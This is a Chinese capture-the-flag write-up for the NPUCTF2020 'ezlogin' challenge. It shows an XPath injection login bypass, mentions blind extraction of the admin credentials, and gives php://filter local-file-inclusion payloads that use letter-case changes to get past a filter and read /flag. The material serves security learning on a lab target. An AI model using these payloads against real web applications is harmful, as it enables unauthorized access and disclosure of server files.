# \[NPUCTF2020]ezlogin

## 考点 <a href="#mmxqm" id="mmxqm"></a>

* XPath盲注

## wp <a href="#oyp0t" id="oyp0t"></a>

F12发现main.js，打开找到登录代码，把数据以XML形式传入

```
functiondoLogin(){
  var username =$("#username").val();
  var password =$("#password").val();
  var token =$("#token").val();
  if(username ==""|| password ==""){
    $(".msg").text("用户名和密码不能为空!");
    return;
  }
  
  var data ="<username>"+username+"</username>"+"<password>"+password+"</password>"+"<token>"+token+"</token>"; 
  $.ajax({
    type:"POST",
    url:"login.php",
    contentType:"application/xml",
    data: data,
    anysc:false,
    success:function(result, status, xhr){
      if(result =='成功'){
        window.location.href ='admin.php';  
      }
      $(".msg").text(result);
      
    },
    error:function(XMLHttpRequest,textStatus,errorThrown){
      $(".msg").text(errorThrown +':'+ textStatus);
    }
  }); 
}
```

但是它的POST数据又不是XML形式，实际上这是Xpath

![](<../.gitbook/assets/图片 (1).png>)

使用`x' or 1=1 or ''='` 绕过登录失败。尝试Xpath盲注

![](../.gitbook/assets/图片.png)

使用脚本注入，得到账号密码为adm1n/gtfly123

然后跳转到`admin.php?file=welcome`很明显的文件包含，并且给了提示，解码后是`flag is in /flag`

```
Welcome!
ZmxhZyBpcyBpbiAvZmxhZwo=
```

``

使用php://filter 读取文件，结果返回nonono ，是过滤了什么

可以对php://filter 使用大小写

```
?file=php://filter/convert.base64-encode/resource=admin
?file=pHp://filter/convert.Base64-encode/resource=/flag
```

## 小结 <a href="#hwr9m" id="hwr9m"></a>

***

1. Content-type是XML，但是POST的数据不是XML格式，可能是XPath
2. php://filter伪协议被过滤时可以使用大小写绕过

``
